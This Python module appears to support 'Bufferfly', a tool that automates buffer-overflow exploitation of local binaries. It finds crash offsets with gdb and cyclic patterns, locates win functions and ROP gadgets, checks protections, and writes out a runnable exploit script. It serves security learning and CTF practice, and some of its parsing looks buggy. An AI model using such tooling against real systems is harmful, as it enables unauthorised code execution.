import sys
import ropgadget
import re
from pwn import *
import re


def dprint(text, argSilent=False):
    """
    Prints the given text if argSilent is set
        Input: 
            - text: text to print
            - argSilent: if False, text will be printed. 
              If not False, text will not be printed
    """
    if not argSilent:
        print(text)


def find_matching_lines(text: str, match: str, breakAfterMatch=False):
    """
    Searches a text for a given string.
        Input:
            - text: text to search through
            - match: string to search for in the given text
            - breakAfterMatch: If set, will stop searching after the 
              first match
        Returns:
            - A list of strings matching the match  
    """
    result = []
    for line in text.split("\n"):
        line = str(line)
        if match in line:
            result += [line]
            if breakAfterMatch:
                break
    return result


def process2text(p, match=None, breakAfterMatch=False) -> str:
    """
    Transforms the output of a process to a newline seperated string
        Input:
            - p: the process giving the output
            - match: if set, only the lines containing the match will be 
              added. If not set, all output lines will be added to the
              string
            - breakAfterMatch: if set, will break after the first match 
              is found
        Returns: A string created by the output of the given process
    """
    result = ""
    line = p.recvline(timeout=1)
    while line != b"":
        if match:
            if match in str(line):
                result += str(line) + "\n"
                if breakAfterMatch:
                    break
        else:
            result += str(line) + "\n"
        try:
            line = p.recvline(timeout=1)
        except EOFError:
            line = b""
    return result


# find the crashycrash
def find_padding(binaryName: str, min: int, pathToOverflow: str=None) -> int:
    """
    Attempts to crash the given binary in order to find the amount of bytes that
    is required to crash the given binary.
    Input:
        - binaryName: path to binary
        - min: minimum amount of padding to test. Will try up to 5 times this
          size.
        - pathToOverflow: input given before giving input to the vulnerable
          buffer
    Returns:
        - Amount of padding required before overwriting eip or None if no
          overflow is found
    """
    # Starting gdb and flushing with cyclic pattern
    gdb_process = process(f"gdb {binaryName}", shell=True)
    bufferSize = min * 5

    gdb_process.sendline("r\n" + cyclic(bufferSize, n=4).decode())
    eip_value = process2text(gdb_process, "EIP", breakAfterMatch=True)
    gdb_process.close()

    paddingRequired = 0
    if "EIP" in eip_value:
        eip_value = re.findall("0x[a-f, A-F, 0-9]{7,8}", eip_value)[0]
        paddingRequired = cyclic_find(pack(int(eip_value, 16)))

    return paddingRequired


def find_function(binaryName: str, functionName=False):
    """
    Searches the give binary for an address of the given function
    Input:
        - binaryName: path to binary
        - functionName: name of function to locate. If no function is given,
          a list of common win-functions is used.
    Returns:
        - address of win-function or None, if none is found
    """

    if not functionName:
        # possibly make below list of common goal-function?
        functionName = ["supersecret", "shell"]

    if type(functionName) is not list:
        functionName = [functionName]

    addresses = []
    gdb_process = process(f"gdb {binaryName}", shell=True)
    gdb_process.sendline("b main\nr")
    gdb_process.stdout.flush()
    for f in functionName:
        gdb_process.sendline(f"print {f}")
        address = process2text(gdb_process, f)
        if "No symbol" in address:
            continue
        a = re.findall('0x[a-f, A-F, 0-9]{6,8}', address)
        functionMatch = re.findall(f"{f}", address)
        if a and functionMatch:
            addresses.append((a[0], functionMatch[0]))
        # gdb_process.stdout.flush()
    gdb_process.close()


    # returns list of tuples containing (0xaddress, functionName)
    return list(set(addresses))


def find_rop_gadget(binaryName: str, ropGadget: str):
    """
    Searches the given binary for the given rop gadget
        Input:
            - binaryName: name of the target binary
            - ropGadget: a string defining the ropGadget to search for
        Returns:
            - a list of addressese of the matches. List will be empty if
              no results are found.
    """
    ropGadgetProcess = process(f"ROPgadget --binary {binaryName}", shell=True)
    match = process2text(ropGadgetProcess, ropGadget).strip()
    matches = [m for m in match.split("\n")] if match else []
    ropGadgetProcess.close()
    return matches


def find_strings(binaryName: str, string: str):
    """
    Searches the given binary for the given string.
        Input:
            - binaryName: name of the target binary
            - string: the string being searched for
        Returns:
            - A list of tuples containing addresses where the string was found
              and the complete string match. 
    """
    # creating process, giving input and grabbing text outupt to variable
    gdb_process = process(f"gdb {binaryName}", shell=True)
    gdb_process.sendline("b main\nr")
    gdb_process.stdin.flush()  # empty stdin
    gdb_process.sendline(f"find {string}")
    gdb_process.recvuntil("Searching")
    result = process2text(gdb_process, string)
    gdb_process.close()

    # seaching through text output for matches of strings
    addresses = []
    for res in result.strip().split("\n"):
        # should find a more elegant way to move past these, men ja
        if "stack" not in res and "None ranges" not in res:
            address = re.findall('0x[a-f, A-F, 0-9]{6,8}', res)
            str_match = re.findall("(?<=\")[\S\s]+(?=\")", res)
            if address and str_match:
                addresses.append((address[0], str_match[0]))
    return addresses


class Protections:
    def __init__(self, binaryName):
        self.binaryName = binaryName
        elf = ELF(binaryName, False)
        self.info = elf.checksec().split(":")
        self.nx = False if "NX disabled" in self.info[3] else True
        self.canary = False if "No canary found" in self.info[2] else True
        self.pie = self.info[4].split()[2] if "No PI" in self.info[2] else True
        self.rwxSegments = True if "Has RWX" in self.info[5] else False
        self.relro = False
        if "No RELRO" in self.info[1]:
            self.relro = False
        elif "Partial RELRO" in self.info[1]:
            self.relro = "Partial"
        elif "Full RELRO" in self.info[1]:
            self.relro = "Full"

    def __str__(self):
        ret = ""
        for line in self.info:
            ret += line
        return ret


def print_hex(i: int, base: int = 16):
    """
    Returns a string representation of a number.
        Input:
            - i: the number to transform
            - base: the base to transform i into
    """
    return str(p32(int(i, base)))[2:-1]


def add_payload(attack: str, attackShort: str, payload: str, outfile: str):
    """
    Adds the given payload to a file. This will be written as an addition
    to a dict in the program created when running this program.
        Input:
            - attack: description of the attack. Will be written
              as a comment in the resultfile
            - attackShort: short description of the attack, used as a key
              for the dict containing paylaods
            - payload: the payload to be used for the described attack
            - outfile: the name of the file where results will be written
    """
    with open(outfile, "a") as f:
        f.write(f"# {attack}:\n")
        f.write(f"payloads[\"{attackShort}\"] = \"{payload}\"\n")


def start_result_file(binaryName: str, outfile: str):
    """
    Adds the beginning of the program file created by Bufferfly. This 
    includes the imports and definition of the dict defining payloads.
        Input:
            - binaryName: name of the target binary
            - outfile: the name of the file where results will be written
    """
    open(outfile, 'w').close()
    with open(outfile, "a") as f:
        f.write("import sys\n"
                "from pwn import *\n\n"
                "payloads = dict()\n")


def finish_result_file(binaryName: str, outfile: str):
    """
    Adds the last part of the program created by Bufferfly. This includes the 
    logic for running the payloads added by Bufferfly and the usage 
    instructions.
        Input:
            - binaryName: name of the target binary
            - outfile: the name of the file where results will be written
    """
    with open(outfile, "a") as f:
        f.write("\nif len(sys.argv) < 2 or sys.argv[1] not in payloads.keys():\n"
                f"\texit(\"Usage: Provide type of attack to attempt. Options: "
                "\"\n\tf\"{str(payloads.keys())[11:-2]}\")\n\n"
                "chosen = sys.argv[1]\n"
                f"p = process(\"{binaryName}\")\n" +
                "p.sendline(payloads[chosen])\n" +
                "p.interactive()\n")
